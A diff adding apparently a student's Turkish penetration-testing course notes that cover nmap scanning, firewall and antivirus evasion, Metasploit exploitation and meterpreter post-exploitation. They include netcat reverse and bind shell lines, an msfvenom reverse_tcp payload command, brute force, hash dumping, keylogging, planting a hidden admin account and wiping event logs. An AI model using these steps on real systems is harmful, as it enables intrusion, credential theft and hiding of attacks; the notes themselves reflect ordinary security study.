@@ -1,0 +1,374 @@
+------------------------------------------------------------------------------------
+Bir iþe girmeye çalýþ,harekete geç,bu alanda profesyonel olarak iþler yapmaya çalýþ
+Profesonel taraf için þirkete girme stajlar vs. kendine yatýrým yapnýz gerekebilcek
+sýký bir program ile sonuçlara ulaþamamýz gerekecek.
+--------------------------------------------------------------------------------------------
+Evernote hesabý aç = bir not defteri uygulamasý
+Not paylaþýmý yapýlacak. O notlarda lablar sunulacak.
+Bu adreslerden labarotuar ortamlarýndan neyi nasýl yapýcagýmýzý daha kolay ve etkili
+bir ögrenme þekli gerçekleþtirilebilir.
+--------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------
+Aktif bilgi toplama
+----------------------------------------------------------------------
+Nmap temelleri
+Nmap tarama yönetemleri
+Keþif Aþamalarý
+Port,Servis,Version Taramalarý
+Ýþletim Sistemi Tespiti
+Nmap Scripting Engine
+Dns,smtp,snmp üzerinden keþif
+anonim bilgi toplama
+------------------------------------------------------
+Pasif bilgileri doðrula
+Ip aralðýndan aktif olan sistemler
+Portlar ve servisler
+Yazýlýmlar ve versiyonlar
+Ýþlerim Sistemleri
+Detaylý veri elde etme
+-----------------------------------------------------
+mesele temel teknikleri anlamak
+rfc=kural dizisi
+bir port taramasý yapýlýr açýk olan portlar bulunur
+bunun üzerinden çalýþan yazýlýmlarý görmeliyim
+versiyonlarýný görmeliyim ki zaafiyetleri varmý.
+eger eski bir version ise o eski versionun zaafiyetinden
+faydalanabiliriz.
+----------------------------------------------------
+** Nmap - Network mapping **
+Að keþif
+Port,servis taramasý
+versiyon tarama
+iþletim sistemi zafiyeti vb.araþtýr.
+------------------------------------------------------------------------------------------------------------
+** Nmap host tanýmlama **
+subnetmask=alt að hesaplama=araþtýr anlarsýn|
+nmap ip_adresi
+nmap ip_adresi-15
+nmap ip_adresi,5,6,7
+nmap -iL iplist.txt = bir ip listesi oluþtur.o ip listesinindekileri tara.
+nmap ip_adresi/24 -exclude ip_adresi = bir network bir bu yeri arama demek için
+---------------------------------------------------------------------------------------------------------
+Nmap port durumlarý ve anlamlarý
+Open:port açýk
+TCP 3-lü el sýkýþma.
+Syn=varsayýlan port tarama tekniðidir.hýzlý ve kayýtsýz
+Tarama iþlemi gönderilen SYN paketlerine gelen cevaba göre gerçekleþir.
+SYN paketine RST+ACK geliyorsa portun kapalý olduðu.eger SYN+ACK geliyorsa portun açýk
+oldugu anlaþýlýr ve cevap olrak RST gönderilir.
+SYN scan atni zamanda Half Open Scan olarak bilinir.
+nmap -sS 10.0.1.5 = SYN taramasý yapmak için
+----------------------------------------------------------------------------------------------------------------
+Ýletiþime geçildigi için artýk karþý tarafýnda bizden haberi var
+dikkatli olmamýz gerekiyor yaptýgýmýz iþlemlerde
+---------------------------------------------------------------------------------------------------------------
+TCP scan-nmap
+----------------------------------------------------------------------------------------------------------
+TCP connect scan,üþlü el sýkýþmayý tamamlar ve loglara düþer.
+daha kesin sonuçlar elde edilir.
+port durumlarý SYN paketine gelen cevaba gerçekleþir.
+
+SYN paketine karþýlýk RST+ACK geliyorsa portun kapalý olduðu anlaþýlýr.
+SYN+ACK geliyorsa portun açýk oldgu anlaþýlýr ve üçlü el sýkýþma tamamlanýr.
+nmap -sT 10.0.1.5
+-----------------------------------------------------------------------------------------------------------------------
+SYN proxy gelen bütün syn isteklerine syn+ack gönder=yani eger tcp iþlemi tamamlanýrsa
+dikkate alýrým,ama eger syn iþleminden cevap alýnca iþlemi keserse dikkate alma gibi bir iþle
+biraz araþtýr.otomatik saldýrlarý engelemek için alýnmýþ bir önlemdir.Pentest'lerin dikkat etmesi gereken bir konu
+önemli.Güvenilir sonuç için Tcp scan daha kesindir.
+------------------------------------------------------------------------------------------------
+Nmap UDP Scan
+UDP portlarýný analiz etmek için kullanýlýr.
+UDP paketlerine gelen cevaba göre analiz yapýlýr.
+Gelen cevap ICMP port Unreachable ise portun kapalýdýr.
+Gelen cevap UDP paketi ise portun açýktýr.
+nmap -sU ip_adresi
+cevap olarak udp geliyorsa orda bir servis var
+eger unreachable geliyorsa servis kapalý.
+--------------------------------------------------------------------------------------
+Nmap- NULL/FIN/XMAS scan =(FÝREWALL'U þaþýrmak için araþtýr)=
+Analizleri benzerdir.
+Gönderilen pakete RST+ACK dönüyorsa portun kapalý,hiçbir paket dönüyorsa 
+portun açýk olduðu anlaþýlýr.
+Cevap ICMP Unreachable ile port filtrelidir.
+farklý flag degerleri kullanýlarak aþýlabilir önlemler.veya boþ flag gönderilir.
+þaþýrtma amaçlý.
+--------------------------------------------------------------------------------
+Nmap- ACK/Windows Scan=(ARAÞTIR FÝREWALL'U AÞMAK ÝÇÝN)=
+ACK Scan Firewall ayarlarýný analizi için sýkca kullanýlýr.
+--------------------------------------------------------------------------------------
+Varsayýlan portlar bellidir.Bulunabilir.Ama bunlar ayarlanarak degiþtirilebilir.
+Dolayýsýyla sadece tahminsel sonuçlardýr.Kesin sonuç istiyorsan.Version taramasý yaparýz
+tek port için yapalým ki süreç uzamasýn.Versiondan gerçekten hangi port onu anlayabiliriz.
+standartýn dýþýnda biþey olsa arayacaktý bulamazsa bulamadým dicekti.
+-------------------------------------------------------------------------------------------
+nmap -sS -sV komutu ile sonuçlar görülebilir.
+iþletim sistemi keþfi = nmap -sT -O
+time to live = her iþletim sistemin de farklýlýk gösterir.bu degere göre 
+hangi iþletim sisteme ait oldugu kesdirilebilir.
+Açýk ve kapalý portlarýn time to live kodlarýndan hesaplayarak sonuç sunar.
+denemeleri yapmadýk teorik olarak isledik=sen kevgirde dene uzun iþlemler oldugu için
+------------------------------------------------------------------------------------------
+nmap ip_Adresi -sT -A = bütün version ve sürüm bilgilerini daha detaylý 
+þekilde ekrana getirir.Detaylý veri almak için.Ben bu makineye gidereken nerelerden
+atladým gbi þeyleri gösteriyor.Firewall varsa þaþýrtma yapabilir.
+-----------------------------------------------------------------------------------
+nmap hiçbiþey söylemezsen en çok kullanýlan bin(1000) portu tarar.
+-p- = komutunu verirsek bütün portlarý tarar.
+parametreler ile en çok kullananýlar portlarý tara
+ve sadece þu portu tara þu aralýgý tara gibi parametreler vererek daha ayrýltýlý
+aramalar yapabilirz.
+----------------------------------------------------------------------------------------
+windows sistem yönetimi egitmi
+-----------------------------------------------------------------------------------------
+versiyon taramasý nasýl yapýlýr= yolladýgý ssh komutu ile banner ý çekerek verisonu veriyor.bannerlara sahte yazýlar
+ile yanlýþ yöntenlerdime yapýlabilir.yapýlandýrma ayarlarý ile bunlar saðlanabilir.(yani bu þekilde bizde þaþýrma yapabiliriz)
+-----------------------------------------------------------------------------------
+nmap çýktýsýný bir dosyanýn içne aktarma parametsinide vardýr.
+her türlü çýktýyý detaylý bir þekilde kayýt tutabilir.grep ile ayýklama 
+iþlemleri yaparak güzel sonuçlar alabiliriz.
+çýktýlar önemli parametreleri araþtýr.
+nmap ip_Adresi -sT -oA daka
+eger hiçbiþey söylemezsek bir ping paketi ile dürter,ondan sonra port taramasý yapar,
+bu dürtme olayý yanlýþ yönlendirme ile yanlýþ saptamalara sebep olabilir.
+-------------------------------------------------------------------------------------
+Gerekli nmap parametreleri
+-h = yardým,nmap ile ilgili herþey mevcut
+-T = hýz degeri nekdar hýzlý tarýycak(varsayýlan 3),firewall ile bu hýz durumu
+esas alanarak engellenebilir.bu hýzý verirken firewall'uda düþünmek gerek. 
+-Pn= 
+-V = 
+-v = çýktýlarý detaylandýrýr.ara ara not verir.çoklu aramalarda beklesi uzun oldugu için kullanýlýr
+-n = dns çözümlemesi yapma demek
+-open = bana sadece açýk portlarý getir demek
+-6 = ipv6 aktifleþtirme 
+--------------------------------------------------------------------------------
+nmap = udp taramasý
+--------------------------------------------------------------------------------
+Cloudfare = korumasýný araþtýr.Saldýrý türleri hakkýnda bilgi edin araþtýrma yap
+-----------------------------------------------------------------------------------
+Nmap Scripting Engine = Nmap için geliþtirilmiþ scriptler bir sürü iþleve ve amaca 
+hitap eder þekilde mevcutttur.Araþtýr.Kullanýþlý olanlarý kullanmayý ögren.
+--scprit ile hangi scprittin çalýþtýraýlabilegini görebiliriz.
+Exploit etme aþamalarý = araþtýr.
+smb-brute üzerinden brute-force yapýlabilir. 
+---------------------------------------------------------------------------------------
+Nmap firewall atlatma sistemleri
+Paket parçalama yöntemi
+ip üzerinden port taramasý ypýyor arada Spoofing yapýyor
+Sanki tarama geliyormuþ gibi bir mac zehirlemesi yapabiliyor-fortinet firewall cihazý
+firewall-bypass script'ti = karþý tarafta firewalla yakalanmadan git.
+--------------------------------------------------------------------------------------
+DNS üzerinden bilgi toplama 
+fierce --dns = dns üzerinden bilgi toplamaya yarayan bir araç
+fierce --dns zonetransfer.me = ile direkt getirir.
+-------------------------------------------------------------------------------------
+Zone Transfer
+-----------------------------------------------------------------------------------
+real ip verme olayýný araþtýr.
+-------------------------------------------------------------------------------------
+Sýk kullanýlan keþif araçlarý
+enum4linux=bu makine adý
+nbtscan  =
+onesixtyone =
+snmpwalk
+smtp-user-enum
+dirb 
+YUkardakileri araþtýr.
+-------------------------------------------------------------------------------------------
+smtp = bir mail protoklu
+netstat kullanýmýný detaylý ögren
+-------------------------------------------------------------------------------------------
+Anonim tarama iþlemleri
+Tor
+proxychains=sana bi proyx tanýmlýyorum,tor u tanýmlýyoruz burdan anonim arama saglayabliyoruz
+Nipe - Perl script
+proxychains nmap -sT =tor üzerinden anomin tarama gerçekleþtirme.
+proxychains kullanýmýný detaylandýr.
+---------------------------------------------------------------------------------------------
+Waf / firewall keþfi
+Gönderilen SYN paketine karþýlýk
+SYN-ACK gelir
+RST gelir 
+karþýmýzdan gerçekten ne var bilmek lazým
+cmd.exe
+/etc/shadow
+/etc/passwd
+cevaplardan çýkarýmlar yapýlabilir.
+baglantý sýfýrlanýrsa veya zaman aþýmana ugrsa IPS vardýr.
+----------------------------------------------------------------------------------------------
+wafw00f = sýkýntýlý istekler yapan bi uygulama.firewall keþiflerinde kulllanýlýr.
+ne oldugunu bazen anlar bazen anlamaz karþýmýzdaki duruma baðlý.
+dig = komutu araþtýr. / ileri seviye web güvenligi araþtýr.
+----------------------------------------------------------------------------------------------
+Zafiyet Keþfi
+web ve að ile alakalý konular.
+zafiyet kavramý = uygulamada protkolde  etc. daha önce keþfedilmiþ yara atak türüne izin veren sistem
+zafiyeti sömürecek koda expolit diyoruz.araç expolit = sömürdükten sonrada payload yapýlacak.
+amaca yönelik yönelik saldýrý payload yapýcagý tahribat.içeri bir ajan yerleþtirmek gibi  düþün.
+--------------------------------------------------------------------------------------------------
+Openvas = Zafiyet keþif aracý 	I Galismero = Zafiyet keþif aracý I Nikto = Zafiyet keþif aracý I W3af             	
+	  Açýk kaynak		I	      Toolkit		  I	    Açýk kaynak		I
+	  Geliþmiþ özellikler	I				  I				I
+	  Güncel		I				  I				I
+--------------------------------------------------------------------------------------------------------------
+(/) Core impact (/) Netsparker (/) Burpsuite (/) Nessus (/) 
+--------------------------------------------------------------------------------------
+Exploit aþamasý
+-------------------------------------------------------------------------------------------------
+Zararlý yazýlýmlarý kullanma aþamalarý
+Bi zafiyeti sömürmek için kullandýgýmýz kod = exploit
+Lokal 	exploit = sýzdýk,yetkimiz çok düþük,ama root olmak istiyoruz,burda iþletim sistemi
+içindeki zafiyetleri kullanmamýz lazým.
+remote 	exploit = uzaktan eriþim için kullanýlmaktadýr.
+0day 	exploit = 
+Dos 	exploit = karþýadaki sistemi crash edicek çalýþýlamaz hale getirecek.
+Web 	exploit = web uygulamalarý yönelik geliþtirrilen zaafiyetler.
+Shellcode = exploit gerçekleþtirildikden sonra çalýþtýrýlacak özelletirilmiþ binaryler
+NOP = no operation, herhangi bir iþlevi yok yada hafýzadaki yeri ögrenmek için bellegi dolduran bitler
+Exploit Veritabanlarý = Exploit-db,0day.today,Securityfocus.com,ledb.ir 
+perl-pytgon-ruby = önemli diller.exploit geliþtirilen diller.
+ortak exploit geliþtirme dili framework çözümü.Exploit Frameworkler.
+Metconsoasploit Framework = Payload(otomatik payloadlar ile kolaylýk saðlar),exploit,auxiliary(yardýmcý araçlar),encoder(güvenlik duvarlarýný atlatmak için)
+Metasploit kurulumu ve güncellemesine interentten bak.
+msfdb inif = veritabný yapýsýný indirir.
+msfconsole=metaspoit açýlýr.
+db_status = kontrol saglanýr.
+workspace -a daka = daka adýna workspace oluþturtur. silmek için -d komutu kullan.
+-------------------------------------------------------------------------------------------------------------------------------------------
+-oA daka -sT -Pn -n -T2 -sV -0 --top-port=2000 = etkili bir nmap taramasý için baya güzel
+------------------------------------------------------------------------------------------------------------------------
+service postgresql start = veritabanýný açmak için kullanýlýr.
+db_status = veritabaný görüntüleme
+services -p 445 = 445 portu olanlarý göster.
+services = servisleri göster.
+içerik import etme konusunu iyice araþtýr.
+-------------------------------------------------------------------------------------------
+db_import ile istedigimiz dosyayý import edebiliriz.
+vulns -h = bilgiler alýnabilir.
+db_export -f /dosya_dizin. baþkasýna gönderip çýkartmak için.baþkasýna gönderiyor diyeri import ediyor kullanmaya devam ediyor
+------------------------------------------------------------------------------------------------------------------------
+searchsploit redis = arama yapýyor = bir expolit aldýk örnek nasýl yazýldýgýný nano ile baktýk ögrendik içinde ne oldugunu.
+---------------------------------------------------------------------------------------------------------------------------------
+metaspolit içinde help yazarak ne var ne yok görebiliriz.
+-------------------------------------------------------------------------------------------------------------------------------------
+Temel komutlar.
+| back = geridön | background= arkaplana atýyor | help = neler var hangi parametre hangi iþe yarar. | set = ayarlarý düzenleme iþlemi | show = göstermek | run meterpreteri çalýþtýr use gibi | load unload |
+db_nmap ip_adresi -p 445 --scprit smb-vuln-* = exploit buluyoruz.
+buldugumuz exploiti = search ile aratýyoruz. bilgileri kontrol ediyoruz.
+use expoilt padini giriyoruz. önümüze ayarlar geliyor.belli baþlýsý var.ordaki ayrýntýlý bir araþtýrma yap
+set RHOST ip_adresi diyerek gidiyoruz.
+options diyerek parameterenin degitigini görebiliriz.
+set payload windows/x64/meterpeter/bind_tcp = payload windows'meterpeter diye biþey yolluyoruz ajan gibi (sömürü payload ile ajan ekledik)
+options diyoruz gelen payload ayarlarýný kullanýyoruz. exploit gerçekleþtirkten sonra RHOST ayaga kalkýcak ve payload ajanýmýz(meterpreter) aktif olucak :)
+ajan içerde :) bundan sonra yapabilcegimiz herþey meterpretere baglý shell diyerek makinenin komut satýrýna ulaþýlabilir.
+sysinfo = ile makine bilgilerini görebiliriz.
+-----------------------------------------------------------------------------------------------------------------------------------------
+bruto force atak basitçe
+2 dosya oluþturduk 
+set pass_file /root/passlist.txt
+set user_
+set user_file /root/userlist.txt
+run
+-------------------------------------------------------------------------------------------------------------------------------------------------
+Payload örneklerini araþtýr.Bu konu önemli.
+--------------------------------------------------------------------------------------------------------------------------------------------------
+Exploit denemeleri yap.Önemli
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+Rverse Shell
+vuherable gidiyoruz= nc attackker 80 -e /bin/sh attacker = nc -i -p 80
+dýþardan içeriye 80 vs 443 açýk firewall dan dolayý açtýgýmýz porta gidemeyebiliriz.
+meterpreter dýþarý çýkar bilgiyi bize getirir.çýkarken firewall sormaz.
+nc vulnerable 6667        -------------------------------
+nc -l -p 6667 -e /bin/sh  -------------------------------
+---------------------------------------------------------
+direkt baglantý þansý yok = bind/sh = pivoting = network zýplama.
+---------------------------------------------------------------------------------------------------------------------------
+msfvenom kullanýmýný ögren = araþtýr.
+her zaman bir zafiyet kullanamya gerek yok exploit kullanmaya her aman gerek yok.
+bir exe üretip bir shell istyebilriz. ayrý bir zararlý yazýlým oluþturuyoruz.
+bir zararlý dosya ürettik hangi sisteme bulaþtýracagýz bulaþtýgý sistemde 5555 ortunu açýcak
+bir web server açýyoruz.start ile baþlatýyoruz yani. 5555
+bir tane dinleyici açýyoruz (bind nedir neden önemlidir.öögren)
+run diyerek çalýþtýrýyoruz
+5555 portuna direk istek atýyor.
+bu iþlemi yaparken herhangi bir zafiyet yok.kandýrma üsülü ile içeriye bir zararlý yazýlým gönderdik.
+karþý tarafa bir exe gönderip onun çalýþmasýný ve karþýmýza shell in gelmesini beklicez.
+-------------------------------------------------------------------------------------------------
+Antivirüs atlatma araclarý =
+--------------------------------------------------------------------------------------------------
+Veil-Evasion Payload ayarlarý =
+Veil-Evasion Payload üretme=
+Virustotal taramasý=
+shellter=
+yukardakiler hakkýnda video izleyerek gerekli bilgiyi ögrenebilirim.
+----------------------------------------------------------------------------------------------------------------
+Post exploit aþamasý (asýl mesele)(Önemli)
+-------------------------------------------------------------------------------------------------------------------------
+active directory = biz bir sürü windows sistemi tek merkezden yönebiliyoruz
+bütün katmanlarda windows kullananlar var.sorun çýktýkça üst kata çýkýlýr.
+hem sistemlerin hem de gruplarýn yönetilmesi gerçekleþtirilsin(windows a çalýþan yönetim) araþtýr
+---------------------------------------------------------------------------------------------------------------------------
+Domain exploitation = ana hedef domaini ele geçirme, amaç domain admin olmak.
+*(dip not=rat teknolojisi kullanmayý ögren,Kullanýlýþ bir sistem)*
+agdaki tüm cigalarý tespit etme
+etki alanýndaki sistemlerin tespiti
+þifrelerin hashlerinin elde edilmesi
+Þifrelerin tüm networkte denemnmesi
+Domain kullancýna ait oturumlarýn tespiti
+---------------------------
+Cihazlara girerken zafiyetler kullanýlabilir.
+bruto-force yapýlabilir.
+sistem içerinde ki detaylý bilgi içeren dosyalar ile ek sitemlere sýzma iþlemi yapýlabilir.
+-------------------------------------------------------------------------------------------
+post exploit---meterpreter
+exploit aþamasý iþlemler
+| NT AUTHORTY\system = windows da et yetkili kullanýcý |
+| screenshot komutu ile ekran görüntüsü alýr  adamýn þifresini veya ne yaptýgýný görebilirz|
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.2 lport
+set payload (payload ayarlarýný yapýlandýrmayý çöz iyice)
+upload komutu ile dosyayý yükleme veya gönderme yapýlabilir.
+download olarak da yapabiliriz.
+execute komutu ile karþýda ki exe programýný çalýþtýrabiliriz.
+---------------------------------------------------------------------------------------------------------------------
+shell diyerek linux ve windows komutlarýný çalýþtýrabiliyoruz.havalý bir isim verelim ki adam silemein mesala systemx vb gibi.
+içerde ki kullanýcýmýzýda adminastör grubuna ekledik.ps diyerek çalýþan tüm prosesleri görebiliriz.
+sýzarken ps deki proseslerin birine sýzýyoruz.bu sistemde kalýcý olamayabilirz.
+lsass.exe bu proses bilgisayar kapandamadan kapanmaz bu acýdan bu proses e migres olmak taþýma bizi biraz daha güvenil bir yere gitmemizi saglar.
+ilk giriþte hangi proses girebilecegimizi görebiliyorduk.
+----------------------------------------------------------------------------------------------
+getsystem = diyerek direk en yetkili olunabilir. 
+getuid = user ýd lerini getirir.
+sisinfo = makinenin ismi /kullanýcý
+-----------------------------------------------------------------------------------------------------------------
+enum_firefox
+run keylogerecorder -t 20
+clearev = bütün izleri sil
+run event_manager -c =
+killav 
+run get_application_list
+Meterpreter komut ve parametleri hakkýnda ayrýntýlý bilgi edin.
+kalýcýlýgý saglamak amaç.arka tarafta bir kullanýcý ekledim adminastor grubuna ekledik
+faydalandýgýmýz zafiyet yamanlandý. o zaman psexec powershell üzerinden iþlem yaptrma yapabiliriz.
+set SMBuser KULLANICIADI
+set SMBPass Þifre
+sessions ile bilgileri göreriz.
+persistence = komutu hakkýnda bilgi edin.
+hashdump = paralo hash ý kabul eder. paralo gibi
+service -p 455 -R remote hosta otamatik olarak 455 portlarýný ekle
+hedef sistemden 10.0.1.7 den domain kontrol makinesine atladýk.
+lab ortamýný geliþtirme ögren (çok çok çok çok çok çok önemli)
+domaine üye tüm sistemlere eriþebilir hale geldik.
+getpid=
+lsaax e taþý prosessi migrate i ile geiþtir.
+screenshot a vncinject ile  giderbilirz.(ama çalýþmadý bir hata oldu)
+set PAYLOAD windows içinden resim olarak bir yere kaydetip çekmeyi denedik
+set Payload windows vncinject sonra run(burdaki kod tam degil)
+vncviewer = komutu. destop yok sa bu kullanýlýr
+yetkili kiþiye iþlem yaptýrmýyorsa proses hatasý vardýr.ama eriþm saglamak istiyoruz
+payload olarak vncinject  = inject edip arayüze baglantý saglayabiliriz o þekildede görübiliriz
+zaman olmadýgý için býraktýk.
+----------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------------
